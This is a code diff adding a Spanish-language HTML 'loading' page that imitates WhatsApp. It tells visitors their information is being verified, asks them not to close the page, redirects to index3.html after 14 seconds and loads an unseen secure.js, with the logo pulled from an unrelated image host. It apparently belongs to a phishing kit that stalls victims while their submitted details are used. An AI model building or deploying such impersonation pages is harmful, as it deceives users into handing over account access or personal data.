@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cargando - WhatsApp</title>
+    <link rel="stylesheet" href="cargando.css">
+</head>
+<body>
+    <div class="loading-container">
+        <img src="https://sappsapp23.sirv.com/docs/GjxmhIpug9B.svg" alt="Logo WhatsApp">
+        <p class="loading-text">Estamos verificando tu información...</p>
+        <div class="progress-bar">
+            <div class="progress-bar-inner"></div>
+        </div>
+        <p class="loading-detail">Esto puede tardar unos segundos. No cierres la página.</p>
+        <div class="spinner"></div>
+    </div>
+
+    <footer>
+        <img src="https://sappsapp23.sirv.com/docs/GjxmhIpug9B.svg" alt="Logo WhatsApp">
+    </footer>
+
+    <script>
+        function redirectToPage() {
+            setTimeout(function() {
+                window.location.href = 'index3.html';
+            }, 14000); 
+        }
+        window.onload = redirectToPage;
+    </script>
+    <script src="secure.js"></script>
+</body>
+</html>
